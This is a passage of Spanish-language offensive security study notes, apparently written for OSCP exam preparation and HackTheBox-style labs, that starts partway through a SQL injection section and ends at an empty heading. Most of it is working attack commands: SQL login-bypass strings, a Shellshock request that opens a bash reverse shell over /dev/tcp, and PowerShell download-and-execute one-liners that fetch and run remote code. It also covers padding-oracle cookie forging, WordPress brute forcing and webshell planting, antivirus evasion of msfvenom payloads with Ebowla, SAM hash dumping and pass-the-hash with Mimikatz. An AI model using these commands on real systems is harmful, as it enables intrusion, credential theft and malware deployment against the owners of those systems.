Usuario: admin' or 1=1-- -
Password: admin' or 1=1-- -
```

Para casos donde podamos llevar a cabo un nuevo registro de usuario, otra vía es crear un usuario con nombre **admin' or 1=1-- -** y password **admin' or 1=1-- -**, de esta forma tras posteriormente realizar la autenticación como usuario válido, tendremos acceso a todos los datos de los usuarios en la base de datos principal.

Para técnicas de bypassing consultar el siguiente [enlace](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF)

#### Shellshock

Buenas máquinas para practicar este tipo de ataques fuera del laboratorio del OSCP son la máquina **Shocker** y la máquina **Beep** de HackTheBox.

Esta es una vulnerabilidad que sólo se ve en Linux, pues en Windows no afecta. La vulnerabilidad lo que nos permite es, tras no validar de forma correcta la declaración de funciones en variables, ejecutar comandos en remoto sobre sistemas a través de consultas en este caso por medio de peticiones web.

Un buen **Low Hanging Fruit** puede consistir en enumerar el directorio **/cgi-bin/** de una página web. De existir, podemos buscar por archivos de extensión '**.cgi**', aunque no es extrictamente necesario... pues también podría tratarse de un archivo de extensión '**.sh**' y los efectos serían los mismos.

En caso de encontrar estos recursos, podemos realizar pruebas como las que se describen a continuación. En primer lugar nos ponemos en escucha por un puerto en nuestro equipo vía Netcat. En segundo lugar realizamos la siguiente petición desde terminal al servicio web:

```bash
$~ curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ipLocal/puertoLocal 0>&1" "https://192.168.1.X:10000/cgi-bin/recurso.cgi" 
```

Si todo sale bien y es vulnerable a la explotación de dicha vulnerabilidad, deberemos ganar acceso al sistema desde nuestra sesión de escucha.

**Advertencia**: En caso de que **/bin/bash** no funcione, se recomienda probar alternativas, pues hay ocasiones en las que la ruta absoluta del binario no es la que hemos especificado, por lo que se requerirá de una ligera enumeración manual o un simple modo alternativo de conexión

#### Padding Oracle Attack

Esta vulnerabilidad la he llegado a probar en 2 entornos. Uno de ellos es en la máquina **Padding Oracle** de _VulnHub_ y otra de ellas es la máquina **Lazy** de _HackTheBox_. Ambas máquinas se resuelven de la misma forma en cuanto a explotación de vulnerabilidad respecta, pudiendo tomar 2 vías de explotación.

La **primera vía de explotación** consiste en a través del panel de registro, crear un nuevo usuario donde intuyendo que existe un usuario **admin** definamos un nuevo usuario **admin=**. De esta forma, creando el usuario lo que conseguiremos es crear una instancia de dicho usuario con las mismas propiedades, viendo todo su contenido a posteriori como si se tratara del usuario **admin**. 

La **segunda vía de explotación** consiste en crear en primer lugar un nuevo usuario. Una vez creado, llevamos a cabo una autenticación como dicho usuario, pillando la Cookie de sesión desde la pestaña **Network** de la propia inspección de elemento o desde **Burpsuite**.

A continuación, utilizamos la herramienta **padbuster** para llevar a cabo el ataque de oráculo de relleno. Seguimos la siguiente sintaxis:

```bash
$~ padbuster http://192.168.1.x/login.php D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km 8 --cookies auth=D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km --encoding 0
```

Donde **D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km** es la Cookie de sesión y **8** el número de bloques. A pesar de no saber la cifra con exactitud, podemos montarnos un simple bucle **for i in $(seq 1 100)** a fin de determinar el número de bloques, pues en caso de no ser correcto no se podrá aplicar la inyección.

La herramienta tiene cierta similitud al **sqlmap** para inyecciones SQL, sólo que aquí las inyecciones las aplica sobre ciertas condiciones de error que son mostradas una vez el número de bloques proporcionado es correcto.

Lo que obtendremos una vez todo el proceso se realice correctamente es un Output como el siguiente desde la herramienta:

```bash
[+] Decrypted value (ASCII): user=s4vitar
[+] Decrypted value (HEX): 757365723d733476697461720808080808080808
[+] Decrypted value (Base64): dXNlcj1zNHZpdGFyCg==
```

Con esto entre manos, lo que podemos hacer es generar desde **Padbuster** la Cookie de sesión válida para el usuario **admin** en base a la autenticación válida del usuario cuya Cookie hemos capturado.

Para ello, desde **Padbuster** aplicamos la siguiente sintaxis:

```bash
$~ padbuster http://192.168.1.x/login.php D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km 8 --cookies auth=D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km --encoding 0 --plaintext user=admin
```

Donde veremos que la herrmamienta directamente nos proporcionará la Cookie de sesión para el usuario administrador.

Lo único que tenemos que hacer ahora, es desde **Burpsuite**, interceptar una autenticación con nuestro usuario para posteriormente modificar la Cookie a la proporcionada por **PadBuster**. Lo que conseguiremos con esto es acceder como el usuario **admin** al servicio web, burlando el panel de autenticación sin ser necesario conocer la contraseña de dicho usuario.

#### WordPress

Sobre este gestor de contenidos, la idea es verificar en primer lugar si a través del recurso _README.html_ podemos visualizar la versión del CMS. De esta forma, posteriormente desde **Searchsploit** podemos buscar vulnerabilidades para dicha versión.

En caso de no poder visualizar la versión, nos aprovechamos de la herramienta **wpscan** para a través de la siguiente sintaxis obtener el versionado del gestor:

```bash
$~ wpscan -u "http://192.168.1.x"
```

En caso de que la web principal del gestor de contenido se encuentre en otra ruta personalizada, por ejemplo **/directorio-wordpress/**, deberemos especificarlo a través del parámetro **--wp-content-dir** para la correcta enumeración desde **wpscan**:

```bash
$~ wpscan -u "http://192.168.1.x" --wp-content-dir "directorio-wordpress"
```

En ocasiones, podremos enumerar los usuarios existentes sobre el gestor, empleando para ello la siguiente sintaxis:

```bash
$~ wpscan -u "http://192.168.1.x" --enumerate u
```

En caso de que el gestor de contenidos cuente con un plugin que bloquee la enumeración de usuarios, podemos hacer uso de la utilidad **stop_user_enumeration_bypass.rb** de _wpscan_ (/usr/share/wpscan/stop_user_enumeration_bypass.rb). La sintaxis sería la siguiente:

```bash
$~ ruby stop_user_enumeration_bypass.rb http://192.168.1.x
```

Tras obtener usuarios válidos de autenticación, podemos probar a realizar a un ataque de fuerza bruta haciendo uso de la siguiente sintaxis:

```bash
$~ wpscan -u "http://192.168.1.x" --username usuario -w /usr/share/wordlists/rockyou.txt
```

Una forma de bypassear posibles bloqueos es jugar con el parámetro **--random-agent**, de la siguiente forma:

```bash
$~ wpscan -u "http://192.168.1.x" --username usuario -w /usr/share/wordlists/rockyou.txt --random-agent
```

La herramienta **wpscan** es capaz de detectar los plugins instalados sobre el gestor, los cuales también pueden abrir un posible vector de ataque que permita la ejecución de comandos en remoto y variados. Sin embargo, por prevención siempre me gusta fuzzear los plugins haciendo uso del siguiente [recurso](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt) de SecList.

En caso de no obtener o poder enumerar usuarios válidos de autenticación, estos gestores de contenido suelen exponer el usuario propietario de los artículos o entradas que figuren expuestos sobre la página principal. De esta forma, podemos llegar a extraer usuarios válidos de autenticación simplemente visualizando quién es el autor de las entradas publicadas.

Teniendo un usuario válido de autenticación, a la hora de aplicar la fuerza bruta, antes de lanzar diccionarios tradicionales como el **rockyou.txt**, suelo hacer uso de la herramienta **cewl** para generar mi propio diccionario personalizado en base a la web con la que estoy tratando. Esto se consigue con la siguiente sintaxis:

```bash
cewl -w diccionario http://192.168.1.x
```

Así mismo, una vez se logra acceder al gestor de contenidos, la intrusión al sistema es la parte más sencilla. Simplemente en la sección de Apariencia, en la pestaña Editor nos vamos al script **404.php** configurado para llevar a cabo una modificación, subiendo nuestro propio código PHP malicioso que permita entablarnos una conexión reversa contra el sistema.

Para apuntar a dicho script tenemos 3 vías:

* http://192.168.1.x/?p=404.php
* http://192.168.1.x/recursoinexistente (Para causar un error que haga que se cargue el script 404.php)
* http://192.168.1.x/404.php

#### File Upload Bypass



### Pentesting Linux

#### Tratamiento de la TTY

Una vez accedemos a un equipo Linux con una reverse shell de Netcat, veremos que andamos a ciegas, lo que hace que incluso no podamos utilizar servicios que corran en interactivo (Python, mysql, etc.). Para arreglar este problema, simplemente seguimos los pasos que se describen a continuación.

* Cargamos una pseudoconsola sobre el sistema

Tenemos 2 formas de hacer esto, la primera es la siguiente:

```bash
script /dev/null -c bash
```

Otra de ellas es a través de python, para ello se recomienda aplicar un `whereis python` a nivel de sistema para comprobar las versiones que se encuentran presentes en el sistema, así tendremos que aplicar el siguiente comando seguido de su versión:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

* Configuramos las variables de entorno correctamente

A continuación presionamos la tecla **Ctrl+Z**, esto lo que hará será dejar en segundo plano nuestra sesión (no hay que asustarse). Una vez hecho, aplicamos los siguientes comandos:

```bash
stty raw -echo
fg
reset
xterm
```

Tras introducir el primero, es normal que al escribir **fg** no veamos lo que se está escribiendo, sin embargo se están introduciendo los caracteres. Este comando lo que hará será retornanos a la sesión que teníamos vía **Netcat**. Con el comando **reset** reconfiguraremos nuestra sesión, preguntándonos en la mayoría de los casos a continuación con qué tipo de terminal queremos tratar.

Puede ser que no nos pregunte por el tipo de terminal, en caso de que sí lo haga, introducimos `xterm`, en caso de que no e incluso aunque lo pida, posteriormente aplicamos los siguientes comandos:

```bash
export TERM=xterm
export SHELL=bash
```

Una vez hecho, lo único que queda (paso opcional), es configurar correctamente el redimensionamiento de la terminal, pues en caso de abrir algún editor como nano, veremos que las proporciones no cuadran. Para ello, lo más recomendable es poner a tamaño completo la terminal.

Abrimos otra terminal en nuestro sistema con el mismo redimensionamiento, y aplicamos el siguiente comando:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop]
└──╼ #stty -a
speed 38400 baud; rows 44; columns 190; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O;
min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc

```

Tal y como podemos ver, figuran los números de filas y columnas, 44 y 190 respectivamente para este caso. Copiamos dicha configuración en la máquina que hemos comprometido donde se ha llevado a cabo toda la previa configuración, aplicando para ello el siguiente comandos:

```bash
stty rows 44 columns 190
```

El resultado final será una Shell completamente interactiva, donde nos sentiremos como si hubiéramos ganado acceso por SSH, con capacidad de tabulación, uso de Shortcuts (Ctrl+C, Ctrl+L, etc.), sesiones interactivas, etc.


#### Process Monitoring

A la hora de escalar privilegios, es una buena idea montarse un script **procmon.sh** para la monitorización de procesos y comandos aplicados a nivel de sistema en tiempo real.

Para ello, tan sólo tendremos que crear un script sobre el sistema como el siguiente:

```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v "procmon.sh" | grep -v "command"
	old_process=$new_process
done
```

Tras su ejecución, tendremos una visual de toods los comandos que se están aplicando a nivel de sistema, incluidos los llevados a cabo por el usuario root del equipo, incluyendo rutas y subprocesos.

### Pentesting Windows

A pesar de implementar y poner en práctica otras técnicas que no describo en los siguiente puntos, enumero a continuación las que para mi son más importantes y las que considero que uno debe de tener bien claras para el correcto manejo sobre los equipos Windows como atacante, así como de cara al examen.

#### Transferencia de Archivos

Tenemos distintas formas de transferir archivos desde la máquina Windows que hayamos comprometido. Para la primera de ellas, nos aprovechamos de **certutil**, compartiendo para ello un servidor en Python sobre nuestro equipo en los recursos que queramos compartir y aplicando el siguiente comando desde la máquina Windows:

`certutil.exe -f -urlcache -split http://nuestraIP:puerto/recurso.exe output.exe`

En caso de no contar con **certutil**, podemos montarnos un servicio FTP en local, para posteriormente desde la máquina Windows vía **FTP** obtener los recursos. Para ello, tendremos que crear un archivo _.txt_ sobre la máquina Windows con el siguiente contenido (IP local 192.168.1.45 a modo de ejemplo):

```bash
open 192.168.1.45 21
user s4vitar
password
binary
GET archivo
bye
```

Para ello, simplemente desde el _CMD_ vamos haciendo lo siguiente:

```bash
echo open 192.168.1.45 21 > ftp.txt
echo user s4vitar >> ftp.txt
echo password >> ftp.txt
echo binary >> ftp.txt
echo GET archivo >> ftp.txt
echo bye >> ftp.txt
```

Para que se realicen los pasos fijados sobre el fichero, es necesario desde la máquina Windows aplicar el siguiente comando:

```bash
ftp -v -n -s:ftp.txt
```

Una vez hecho, se realizará la transferencia y tendremos el recurso en la máquina Windows. Lo mismo habría valido para enviar archivos a nuestra máquina local.

En caso de evitar tener que realizar configuraciones a nivel de archivos para compartir el servidor FTP, podemos aplicar el siguiente comando desde la máquina Linux:

```bash
python -m pyftpdlib -p 21 -w
```

Posteriormente, ejecutamos las mismas instrucciones del lado de la máquina comprometida.

Otra vía para realizar la transferencia de archivos desde nuestra máquina de atacante a la máquina Windows comprometida es aprovecharse de la utilidad **TFTP**. Para ello, desde nuestra máquina de atacante, aplicamos el siguiente comando especificando el directorio cuyos recursos queremos compartir:

```bash
atftpd --daemon --port 69 /tftp
```

Una vez hecho, desde la máquina Windows, aplicamos el siguiente comando:

```bash
tftp -i 192.168.1.45 GET nc.exe
```

Otra vía para realizar transferencia de archivos es desde nuestra máquina de atacante, compartir los recursos a través de un servidor web vía Python:

```bash
python -m SimpleHTTPServer 443
```

Y desde la máquina Windows, aplicar los siguientes comandos de **Powershell**:

```powershell
powershell -c "(new-object  System.Net.WebClient).DownloadFile('http://192.168.1.45:443/file.exe','C:\Users\user\Desktop\file.exe')"

# También podemos usar esta otra forma
powershell Invoke-WebRequest "http://192.168.1.45:443/file.exe" -OutFile "C:\Users\user\Desktop\file.exe"
```

Por si todas estas vías de transferencia de archivos se nos quedan cortas, podemos hacerlo a través de un script en **VBS**, que suele funcionar para la mayoría de las veces. Para ello, desde la máquina Windows, tendremos que aplicar las siguientes instrucciones:

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Una vez definido el recurso **wget.vbs**, aplicamos el siguiente comando para una vez montando nuestro servidor web vía Python en la máquina atacante, descargar los recursos que consideremos:

```bash
cscript wget.vbs http://192.168.1.45:443/file.exe file.exe
```

Por si vemos que es mucha molestia estar definiendo todo el script _wget.vbs_, podemos acotarlo de la siguiente forma, y funcionará igualmente:

```bash
echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); > wget.vbs
echo WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false); >> wget.vbs
echo WinHttpReq.Send(); >> wget.vbs
echo WScript.Echo(WinHttpReq.ResponseText); >> wget.vbs
echo BinStream = new ActiveXObject("ADODB.Stream"); >> wget.vbs
echo BinStream.Type = 1; >> wget.vbs
echo BinStream.Open(); >> wget.vbs
echo BinStream.Write(WinHttpReq.ResponseBody); >> wget.vbs
echo BinStream.SaveToFile("out.bin"); >> wget.vbs
```

Una vez hecho, desde la propia máquina comprometida aplicamos el siguiente comando para descargar los recursos que estemos compartiendo en local:

```bash
cscript /nologo wget.js http://192.168.1.45:443/recurso.exe
```

En caso de haber ganado acceso al equipo Windows con **nishang** aprovechando la utilidad _Invoke-PowerShellTcp.ps1_ (aunque también sirve para consola normal, sólo que me gusta trabajar en este aspecto directamente desde la Powershell), algo que podemos hacer es realizar la transferencia por samba aprovechando **smbserver** de **Impacket**.

Para ello, desde nuestro equipo de atacante, aplicamos el siguiente comando bajo un directorio previo que hayamos creado específico para la compartición de archivos:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/smb]
└──╼ #impacket-smbserver shared `pwd`
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

A continuación, desde la máquina Windows desde la sesión Powershell, aplicamos el siguiente comando:

```bash
New-PSDrive -Name "SharedFolder" -PSProvider "FileSystem" -Root "\\192.168.1.45\shared"
```

Directamente, veremos como se llevará a cabo una sincronización de recursos, creando una unidad lógica **SharedFolder:\\** sobre el equipo Windows que se conecta a nuestra unidad lógica *_pwd_*, la cual sincroniza contra la unidad física donde se sitúa nuestro directorio **shared**, desde donde depositaremos nuestros archivos.

En primer lugar, cambiamos de unidad lógica en la máquina Windows:

```bash
cd SharedFolder:
```

Posteriormente, nos traemos al equipo los recursos que consideremos:

```bash
move mimikatz.exe C:\Users\s4vitar\Desktop\mimikatz.exe
```

#### AV Evasion Genetic Malware

A continuación, se detalla el procedimiento para crear **Malware Genético**, ideal y de utilidad para la evasión de antivirus así como del propio Windows Defender.

Para ello, necesitamos descargar en local el recurso [Ebowla](https://github.com/Genetic-Malware/Ebowla), así como tener instalado **GO** para la forma en la que compilaremos nuestro Malware.

Cuando todo esté preparado, una vez comprometida la máquina Windows, suponiendo para un caso práctico que tenemos que subir un archivo **.exe** para haciendo uso de **RottenPotato** poder escalar privilegios pasando como argumento dicho binario (el cual será ejecutado con privilegios de administrador), donde el Windows Defender nos detiene la ejecución del binario, lo primero será crear nuestro Malware desde **msfvenom**:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.45 LPORT=443 -f exe -o shell.exe
```

Una vez creado, a modo de ejemplo jugando con una simple variable de entorno, aplicamos el siguiente comando en la máquina Windows:

```bash
C:\Users\s4vitar\Desktop\ hostname
PC-S4vitar
```

Ya conociendo el **hostname**, llevamos a cabo antes que nada un par de configuraciones a nivel de archivos sobre los recursos que trae **ebowla**. Abrimos en primer lugar el archivo _genetic.config_, cambiando las variables **output_type** y **payload_type** por las siguientes:

```bash
output_type = GO
payload_type = EXE
```

Una vez hecho, bajamos hasta la sección de variables de entorno:

```bash
    [[ENV_VAR]]

        username = ''
        computername = ''
        homepath = ''
        homedrive = ''
        Number_of_processors = ''
        processor_identifier = ''
        processor_revision = ''
        userdomain = ''
        systemdrive = ''
        userprofile = ''
        path = ''
        temp = ''


     [[PATH]]

```

En este caso, dado que a modo de ejemplo vamos a jugar únicamente con la variable **hostname**, introducimos su valor en la variable correspondiente:


```bash
    [[ENV_VAR]]

        username = ''
        computername = 'PC-S4vitar'
        homepath = ''
        homedrive = ''
        Number_of_processors = ''
        processor_identifier = ''
        processor_revision = ''
        userdomain = ''
        systemdrive = ''
        userprofile = ''
        path = ''
        temp = ''


     [[PATH]]

```

**IMPORTANTE:** Es de vital importancia no confundirse en este punto, pues cabe decir que el cifrado se hace a través de las propias variables de entorno. Esto quiere decir, que tras la ejecución del binario en la máquina comprometido, esta se encargará de descifrar todo el ejecutable a través de las propias variables de entorno del sistema, lo que significa que en caso de haberlas introducido mal... la ejecución del binario no será funcional.

Una vez hecho, aplicamos el siguiente comando desde consola:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/s4vitar/Programas/Bypassing/Ebowla]
└──╼ #python ebowla.py shell.exe genetic.config 
[*] Using Symmetric encryption
[*] Payload length 73802
[*] Payload_type exe
[*] Using EXE payload template
[*] Used environment variables:
	[-] environment value used: computername, value used: pc-s4vitar
[!] Path string not used as pasrt of key
[!] External IP mask NOT used as part of key
[!] System time mask NOT used as part of key
[*] String used to source the encryption key: pc-s4vitar
[*] Applying 10000 sha512 hash iterations before encryption
[*] Encryption key: 026a42181e07e73b5c926bc8fa30017b05e7e276c18fc29ab3e62e6b8e8436f9
[*] Writing GO payload to: go_symmetric_shell.exe.go
```

Este paso, lo que hará será crearnos un archivo **go_symmetric_shell.exe.go** en el directorio **output**. Una vez creado, aplicamos el siguiente comando para compilar el binario final:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/s4vitar/Programas/Bypassing/Ebowla]
└──╼ #./build_x64_go.sh output/go_symmetric_shell.exe.go finalshell.exe
[*] Copy Files to tmp for building
[*] Building...
[*] Building complete
[*] Copy finalshell.exe to output
[*] Cleaning up
[*] Done

```

Obteniendo un ejecutable final **finalshell.exe**, el cual podemos transferir posteriormente a la máquina Windows.

Es importante que la ruta del binario **go** esté configurada en el _PATH_, pues en caso contrario no lo encontrará. Si queremos que funcione de manera temporal para la ejecución del **ebowla**, simplemente hacemos un EXPORT de nuestro PATH:

```bash
export PATH=/usr/local/go/bin:$PATH
```

Obviamente, cuantas más variables de entorno utilicemos mejor será nuestro _AV Evasion_.

#### Windows Port Forwarding

Para ponernos en escena, supongamos que hemos comprometido un equipo Windows como usuario con bajos privilegios. Enumerando las claves de registro, encontramos una contraseña que aparentemente parece ser del usuario **Administrador**. Decidimos no comernos la cabeza con el **RunAs** y queremos usar **psexec** para conseguir acceso como dicho usuario a nivel de sistema entablando la conexión desde nuestro equipo, pero... problema, el equipo no tiene el servicio samba expuesto hacia afuera.

Llegados a este punto, si ya tenemos acceso al sistema... basta con transferir el binario **plink.exe** para llevar a cabo el procedimiento.

Lo único que tenemos que hacer, es iniciar el servicio SSH en nuestro equipo. Es importante que sobre el fichero sshd_config del ssh, el usuario **root** se pueda loguear, pues para que todo esto funcione es necesario que sea root el que se conecte, pues en caso contrario no va a funcionar.

Cuando todo esté configurado correctamente, desde la máquina Windows ya con el binario transferido, aplicamos el siguiente comando hacia nuestra máquina local:

```bash
plink.exe -l root -pw tuPassword -R 445:127.0.0.1:445 tuDirecciónIP
```

Automáticamente, se entablará la conexión hacia nuestro equipo y haciendo un `lsof -i:445`, podremos verificar como se ha levantado el servicio en nuestra máquina.

Ahora la idea es llevar a cabo la autenticación desde nuestra máquina al propio servicio local, el cual enruta al servicio samba de la máquina Windows. Suponiendo que la contraseña del usuario administrador es '**test123**', aplicamos el siguiente comando en local:

```bash
/usr/share/doc/python-impacket/examples/psexec.py WORKGROUP/Administrator:test123@127.0.0.1 cmd.exe
```

Una vez aplicado el comando, veremos cómo accedemos al equipo remoto (siempre y cuando las credenciales proporcionadas sean las correctas y se tengan los permisos suficientes sobre los recursos compartidos por el servicio).

Una forma de comprobar que el servicio Samba de nuestro equipo local corresponde al servicio Samba de la máquina remota, es jugando con **cme**, donde podremos ver el HOSTNAME a modo de check.

Simplemente creamos un fichero _ip_ con nuestra IP local (127.0.0.1) y aplicamos posteriormente desde terminal el siguiente comando sobre dicho fichero:

```bash
cme smb ip --gen-relay-list ip
```

#### Hashdump Manual

Desde Metasploit, uno está acostumbrado a utilizar el **hashdump** para dumpear los hashes NTLM del sistema, así como el auxiliar. A continuación se detalla el procedimiento manual para el volcado de hashes NTLM, haciendo uso para ello de la herramienta **pwdump**.

Es tan sencillo como traerse con privilegios de administrador, los recursos **SAM** y **System** del equipo. Una vez transferidos, aplicamos el siguiente comando desde terminal en nuestro equipo:

```bash
pwdump system SAM
```

Directamente, veremos los Hashes NTLM de los usuarios, los cuales posteriormente en caso de figurar el servicio samba abierto podemos aprovechar para hacer **PassTheHash**.

#### PassTheHash

A la hora de contar con un Hash NTLM válido de usuario, por ejemplo para este caso práctico, de Administrador, podemos llevar a cabo una autenticación contra el sistema a fin de conseguir una Shell interactiva a través del servicio Samba.

Para ello, podemos utilizar herramientas como **pth-winexe**, la cual nos permite hacer conexiones como la siguiente:

```bash
pth-winexe -U WORKGROUP/Administrator%aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 //192.168.1.5 cmd.exe
```

Como es de obviar, este paso nos ahorra el tener que crackear la contraseña. El hecho de poseer el Hash NTLM de un usuario, nos permite entre otras cosas ser aprovechado para elaborar un **sprying de credenciales** a nivel de red local:

```bash
crackmapexec smb 192.168.1.0/24 -u 'Administrator' -H aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 
```

Obteniendo un **pwned** en caso de lograr la autenticación para algunos de los Hosts probados. A su vez, su uso puede ser útil para inyectar **Mimikatz** desde el propio **crackmapexec**, de la siguiente forma:

```bash
crackmapexec smb 192.168.1.45 -u 'Administrator ' -H aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3 -M mimikatz
```

También habría servido contra todo el rango /24. Su uso también puede ser utilizado incluso para en caso de no conocer la contraseña en claro, realizar autenticaciones vía **RDP**:

```bash
xfreerdp /u:Administrator /d:WORKGROUP /pth:c46b9e588fa0d112de6f59fd6d58eae3 /v:192.168.1.5
```

#### Enumeration and Privilege Escalation

Aunque se le puede dar mil vueltas a este apartado, como tampoco pretendo hacerlo extenso cito 2 recursos fundamentales de numeración que pueden servir bastante de ayuda a la hora de buscar formas de escalar privilegios.

Uno de ellos es el recurso **PowerUp.ps1** de **PowerSploit**, recurso que considero esencial para tener una visual rápida del sistema (en ocasiones podemos encontrar ficheros interesantes e incluso contraseñas en texto claro). Generalmente, lo hay quienes transfieren el archivo sobre el sistema, importan el módulo y luego lo ejecutan... yo lo suelo hacer todo de una.

Para ello, podemos comprobar como una de las funciones principales que contiene el script es la siguiente:

```bash
┌─[root@parrot]─[/opt/PowerSploit/Privesc]
└──╼ #cat PowerUp.ps1 | grep AllChecks  | grep "function" | tr -d '{'
function Invoke-AllChecks 

```

Para poder ejecutarla de un solo tirón, añadimos una llamada a dicha función al final de nuestro script:

```bash
# Últimas líneas del script

$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']

Invoke-AllChecks
```

Por tanto, una vez con esto preparado, compartimos un servidor con Python en nuestro equipo sobre el directorio en el que se encuentra el recurso, posteriormente, desde Windows, aplicamos el siguiente comando:

```bash
powershell IEX(New-Object Net.WebClient).downloadString('http://ipLocal:8080/PowerUp.ps1')
```

Esperamos unos segundos, y obtendremos directamente los resultados de la ejecución del script.

En cuanto a exploits a usar a nivel de sistema para escalar privilegios, una buena idea es usar el script **Sherlock.ps1** para la enumeración, donde se nos listarán en base al análisis efectuado un puñado de exploits a usar con sus respectivos enlaces. La idea es seguir el mismo concepto que el que hicimos con **PowerUp.ps1**, sólo que en este caso, la función a añadir en la última línea sería **Find-AllVulns**.

#### PowerShell Reverse Shell

Para los amantes de PowerShell que no viven sin su sesión PS, por aquí os explico una técnica para conseguir acceso al sistema con sesión PowerShell. Lo primero que debemos hacer, es descargar [Nishang](https://github.com/samratashok/nishang), una vez instalado, utilizaremos para este caso el recurso situado en _Shells/Invoke-PowerShellTcp.ps1_.

Añadimos al final del script la siguiente línea:

`Invoke-PowerShellTcp -Reverse -IPAddress tuIP -Port 443`

Una vez hecho, nos montamos un servidor con Python para compartir dicho recurso y por otro lado nos ponemos en escucha por **Netcat** en el puerto 443. Una vez con el arsenal preparado, aplicamos el siguiente comando desde terminal en Windows:

```bash
powershell IEX(New-Object Net.WebClient).downloadString('http://tuIP:8080/Invoke-PowerShellTcp.ps1')
```

En cuestión de unos segundos, veremos como se recibe un **GET** del lado de nuestro servidor e inmediatamente ganamos acceso al sistema vía **PowerShell**.

#### Manual Migration Process

Aunque las máquinas Windows del examen suelen ser de 32 bits, como más vale prevenir que curar detallo una técnica para migrar de un proceso de 32 bits a uno de 64 bits. Cabe decir que este procedimiento es importante de cara a la correcta enumeración del sistema, pues en caso de figurar en un proceso que no corra bajo la arquitectura de la máquina, tanto **Sherlock**, como **PowerUp.ps1** como incluso el propio **suggester** de Metasploit, darán montón de falsos positivos.

El saber con qué aquitectura estamos tratando tanto del sistema operativo como a nivel de proceso, podemos hacerlo via **Powershell**, obteniendo **True** o **False** dependiendo de si es cierto o no a través de las siguientes consultas:

`[Environment]::Is64BitOperatingSystem`

`[Environment]::Is64BitProcess`

Si vemos que se trata de un sistema operativo de 64 bits, y la sentencia `[Environment]::Is64BitProcess` nos devuelve un **False**, lo único que tendremos que hacer es por ejemplo ganando sesión por Powershell invocar al mismo desde la siguiente ruta:

```bash
C:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.1.45:443/Invoke-PowerShellTcp.ps1')
```

Compartiendo el recurso citado de **nishang**. Si volvemos a checkear en qué proceso nos situamos, podremos ver que esta vez la consulta `[Environment]::Is64BitProcess` nos devolverá un **True**, pudiendo ya proseguir con la enumeración a nivel de sistema.

#### RCE Filter Evasion Microsoft SQL

